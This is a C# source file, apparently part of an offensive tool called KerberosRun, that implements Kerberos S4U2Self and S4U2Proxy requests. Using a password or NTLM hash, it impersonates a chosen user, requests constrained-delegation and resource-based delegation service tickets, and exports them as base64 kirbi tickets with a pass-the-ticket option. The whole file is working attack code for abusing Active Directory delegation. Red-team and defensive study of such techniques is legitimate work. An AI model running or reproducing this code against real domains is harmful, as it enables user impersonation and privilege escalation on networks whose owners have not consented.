using System;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System.Threading;
using Kerberos.NET.Transport;
using Microsoft.Extensions.Logging;
using Kerberos.NET;
using System.Collections.Generic;
using System.Linq;

namespace KerberosRun
{
    class S4U
    {
        private static KerberosKey credKey;
        //S4U2Self
        public static async System.Threading.Tasks.Task<KrbTgsRep> S4U2Self(string kdc,
            ILoggerFactory logger,
            TcpKerberosTransport transport,
            KrbAsRep asRep,
            string username,
            string password,
            string domainName,
            string impersonateuser,
            bool outKirbi = false,
            bool verbose = false,
            bool ptt = false,
            string hash = null,
            EncryptionType etype = EncryptionType.RC4_HMAC_NT)
        {
            var now = DateTime.UtcNow;

            credKey = password != null ?
                new KerberosPasswordCredential(username, password, domainName).CreateKey() :
                new Utils.KerberosHashCreds(username, hash, etype, domainName).CreateKey();


            KrbEncAsRepPart asDecrypted = password != null ?
                new KerberosPasswordCredential(username, password, domainName).DecryptKdcRep(
                asRep,
                KeyUsage.EncAsRepPart,
                d => KrbEncAsRepPart.DecodeApplication(d)) :
                new Utils.KerberosHashCreds(username, hash, etype, domainName).DecryptKdcRep(
                          asRep,
                          KeyUsage.EncAsRepPart,
                          d => KrbEncAsRepPart.DecodeApplication(d));

            var sessionKey = asDecrypted.Key;


            //Request Service Ticket parameters

            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions =
            KdcOptions.Forwardable |
            KdcOptions.Renewable |
            KdcOptions.RenewableOk;
            string s4u = impersonateuser;
            KrbTicket s4uTicket = null;
            KrbTicket u2uServerTicket = null;


            var rst = new RequestServiceTicket()
            {
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = domainName,
            };

            var tgt = asRep.Ticket;

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.EncTktInSkey;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions |= KdcOptions.ConstrainedDelegation;

                additionalTickets.Add(rst.S4uTicket);
            }



            //EncryptionType[] kdcReqEtype = { EncryptionType.RC4_HMAC_NT };

            string[] name = { username };

            var body = new KrbKdcReqBody
            {
                EType = KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = name
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = name
                }
            };


            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );


            //ApReq
            //Authenticator
            var authenticator = new KrbAuthenticator
            {
                CName = asRep.CName,
                Realm = asRep.Ticket.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            var subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);

            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            var encryptedAuthenticator = KrbEncryptedData.Encrypt(
                authenticator.EncodeApplication(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqAuthenticator
            );


            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };



            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                }
            };

            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(sessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            var tgs = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };



            ReadOnlyMemory<byte> encodedTgs = tgs.EncodeApplication();


            Console.WriteLine("[*] Sending TGS-REQ [S4U2Self] ...");
            if (verbose) { PrintFunc.PrintReq(tgs, credKey, sessionKey.AsKey()); }
            


            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();



            KrbTgsRep tgsRep = null;




            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                rst.Realm,
                encodedTgs,
                cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                Console.WriteLine("[x] Kerberos Error: {0}", pex.Message);
                Environment.Exit(0);
            }


            Console.WriteLine("[*] Receiving TGS-REP [S4U2Self] ...");
            try
            {
                KrbEncTgsRepPart tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
                subSessionKey.AsKey(),
                KeyUsage.EncTgsRepPartSubSessionKey,
                (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));


                if (verbose)
                {
                    PrintFunc.PrintRep(tgsRep, credKey);

                    Console.WriteLine("    * [Decrypted Enc-Part]:");
                    PrintFunc.PrintRepEnc(tgsDecryptedRepPart, credKey);

                    //=========================================

                    //TGS-REQ Ticket Enc-Part
                    KrbEncTicketPart ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt
                        (credKey,
                        KeyUsage.Ticket,
                        (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));

                    Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
                    PrintFunc.PrintTicketEnc(ticketDecrypted);
                    //=========================================
                   
                }

                if (outKirbi)
                {
                    var kirbiTGS = Kirbi.toKirbi(tgsRep, tgsDecryptedRepPart, ptt);

                    Console.WriteLine("[+] TGS Kirbi:");
                    Console.WriteLine("    - {0}", Convert.ToBase64String(kirbiTGS));
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
            }
            

            

            return tgsRep;


        }


        //S4U2Proxy
        //[MS-SFU] 3.2.5.2.1.2 Using ServicesAllowedToSendForwardedTicketsTo
        //The KDC checks if the security principal name(SPN) for Service 2, 
        //identified in the sname and srealm fields of the KRB_TGS_REQ message, 
        //is in the Service 1 account's ServicesAllowedToSendForwardedTicketsTo parameter. 
        //If it is, then the KDC replies with a service ticket for Service 2. 
        //Otherwise the KDC MUST return `KRB-ERR-BADOPTION`.
        public static async System.Threading.Tasks.Task S4U2Proxy(string kdc,
            ILoggerFactory logger,
            TcpKerberosTransport transport,
            KrbAsRep asRep,
            KrbTgsRep s4u2self,
            string username,
            string password,
            string domainName,
            string impersonateuser,
            string spn,
            bool outKirbi = false,
            bool verbose = false,
            bool ptt = false,
            string hash = null,
            EncryptionType etype = EncryptionType.RC4_HMAC_NT)
        {

            var now = DateTime.UtcNow;

            credKey = password != null ?
                 new KerberosPasswordCredential(username, password, domainName).CreateKey() :
                 new Utils.KerberosHashCreds(username, hash, etype, domainName).CreateKey();


            KrbEncAsRepPart asDecrypted = password != null ?
                new KerberosPasswordCredential(username, password, domainName).DecryptKdcRep(
                asRep,
                KeyUsage.EncAsRepPart,
                d => KrbEncAsRepPart.DecodeApplication(d)) :
                new Utils.KerberosHashCreds(username, hash, etype, domainName).DecryptKdcRep(
                          asRep,
                          KeyUsage.EncAsRepPart,
                          d => KrbEncAsRepPart.DecodeApplication(d));

            var sessionKey = asDecrypted.Key;


            //Request Service Ticket parameters

            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions =
            KdcOptions.Forwardable |
            KdcOptions.Renewable |
            KdcOptions.RenewableOk;
            string s4u = null;
            KrbTicket s4uTicket = s4u2self.Ticket;
            KrbTicket u2uServerTicket = null;



            var rst = new RequestServiceTicket()
            {
                ServicePrincipalName = spn,
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = domainName
            };


            var sname = rst.ServicePrincipalName.Split('/', '@');
            var tgt = asRep.Ticket;

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.Forwardable;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions = rst.KdcOptions | KdcOptions.ConstrainedDelegation | KdcOptions.CNameInAdditionalTicket;

                additionalTickets.Add(rst.S4uTicket);
            }

            //EncryptionType[] kdcReqEtype = { EncryptionType.RC4_HMAC_NT };
            string[] name = { };
            var body = new KrbKdcReqBody
            {
                EType = KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = sname
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = name
                },
            };

            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );


            //ApReq
            //Authenticator
            var authenticator = new KrbAuthenticator
            {
                CName = asRep.CName,
                Realm = asRep.Ticket.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            var subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);

            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            var encryptedAuthenticator = KrbEncryptedData.Encrypt(
                authenticator.EncodeApplication(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqAuthenticator
            );

            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };


            var pacOptions = new KrbPaPacOptions
            {
                Flags = PacOptions.ResourceBasedConstrainedDelegation
            }.Encode();

            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                },
                new KrbPaData
                {
                    Type = PaDataType.PA_PAC_OPTIONS,
                    Value = pacOptions
                }
            };



            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(subSessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            var tgs = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };



            ReadOnlyMemory<byte> encodedTgs = tgs.EncodeApplication();


            Console.WriteLine("[*] Sending TGS-REQ [S4U2Proxy] ...");
            if (verbose) { PrintFunc.PrintReq(tgs, credKey, sessionKey.AsKey()); }
           


            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();



            KrbTgsRep tgsRep = null;
            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                rst.Realm,
                encodedTgs,
                cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                Console.WriteLine("[x] Kerberos Error: {0}", pex.Message);
                Environment.Exit(0);
            }


            Console.WriteLine("[*] Receiving TGS-REP [S4U2Proxy] ...");

            try
            {
                KrbEncTgsRepPart tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
               subSessionKey.AsKey(),
               KeyUsage.EncTgsRepPartSubSessionKey,
               (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));

                if (verbose)
                {
                    PrintFunc.PrintRep(tgsRep, credKey);

                    Console.WriteLine("    * [Decrypted Enc-Part]:");
                    PrintFunc.PrintRepEnc(tgsDecryptedRepPart, credKey);
                }

                if (outKirbi)
                {
                    var kirbiTGS = Kirbi.toKirbi(tgsRep, tgsDecryptedRepPart, ptt);

                    Console.WriteLine("[+] TGS Kirbi:");
                    Console.WriteLine("    - {0}", Convert.ToBase64String(kirbiTGS));
                }
            }catch(Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
            }
            
            

        }
    }
}
